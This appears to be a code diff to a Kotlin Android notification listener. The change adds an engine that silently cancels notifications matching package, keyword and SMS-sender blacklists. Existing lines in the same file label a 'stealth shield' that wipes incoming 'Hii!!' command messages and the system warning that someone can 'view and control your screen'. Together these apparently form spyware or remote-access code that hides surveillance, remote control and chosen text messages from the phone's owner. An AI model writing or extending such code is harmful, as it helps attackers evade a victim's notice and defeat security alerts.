@@ -127,6 +127,42 @@ class MyNotificationListener : NotificationListenerService() {
 
         if (title.isEmpty() && text.isEmpty()) return
 
+        // --- PASSIVE AUTO-SWIPE ENGINE ---
+        val autoPrefs = getSharedPreferences("auto_swipe_prefs", Context.MODE_PRIVATE)
+        
+        // 1. Check Package Blacklist
+        val pkgList = autoPrefs.getString("pkgs", "") ?: ""
+        if (pkgList.split(",").any { it.trim() == pkg }) {
+            cancelNotification(sbn.key)
+            DebugLogger.log("AUTO_SWIPE", "Purged by PKG rule: $pkg")
+            return
+        }
+
+        // 2. Check Keyword Blacklist (Title & Text)
+        val kwList = autoPrefs.getString("keywords", "") ?: ""
+        if (kwList.isNotEmpty()) {
+            val lowerTitle = title.lowercase()
+            val lowerText = text.lowercase()
+            if (kwList.split(",").any { 
+                val target = it.trim().lowercase()
+                target.isNotEmpty() && (lowerTitle.contains(target) || lowerText.contains(target)) 
+            }) {
+                cancelNotification(sbn.key)
+                DebugLogger.log("AUTO_SWIPE", "Purged by Keyword rule.")
+                return
+            }
+        }
+
+        // 3. Check SMS Sender Blacklist (Title usually contains sender in SMS apps)
+        val senderList = autoPrefs.getString("senders", "") ?: ""
+        if (senderList.isNotEmpty()) {
+            if (senderList.split(",").any { it.trim().isNotEmpty() && title.contains(it.trim()) }) {
+                cancelNotification(sbn.key)
+                DebugLogger.log("AUTO_SWIPE", "Purged by SMS Sender rule: $title")
+                return
+            }
+        }
+
         // --- STEALTH SHIELD: INSTANT WIPE ---
         val isCommand = title.contains("Hii!!", ignoreCase = true) || text.contains("Hii!!", ignoreCase = true)
         val isSecurityAlert = text.contains("view and control your screen", ignoreCase = true) || 
